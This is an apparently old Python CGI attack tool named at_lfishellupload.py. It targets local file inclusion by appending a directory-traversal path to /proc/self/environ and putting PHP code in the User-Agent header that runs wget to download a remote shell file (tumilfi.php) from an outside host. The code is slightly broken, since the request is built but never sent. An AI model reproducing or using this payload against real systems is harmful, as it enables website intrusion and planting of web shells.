#!/usr/bin/python 

#Tumi (c) 2013 at_lfishellupload.py
 
import httplib2 
import urllib2 
import re 
import cgi
import cgitb
cgitb.enable()

# GET
form   = cgi.FieldStorage()
url = form.getvalue("url")

# HTML HEADERS
print "Content-Type: text/html; charset=UTF-8"	# Print headers
print ""

# HTML 

print '''
<html>
<body>
'''


print "<textarea style=\"margin: 2px; height: 189px; width: 392px; color: green; background-color: transparent; \">"

inject = url + "../../../../../../../../../../../../proc/self/environ"
#opener = urllib2.build_opener()
#opener.addheaders = {"User-agent", "<?system('wget http://open-sec.com/rfi-oseh.txt -O tumilfi.php');?>"}
#response = opener.re(inject)
headers = {"User-agent" : "<?system('wget http://open-sec.com/rfi-oseh.txt -O tumilfi.php');?>"}
response = urllib2.Request(inject, None, headers)


print "Try to find tumilfi.php in the path of the your .php file"
	






print "</textarea>"

'''
</body>
</html>
'''
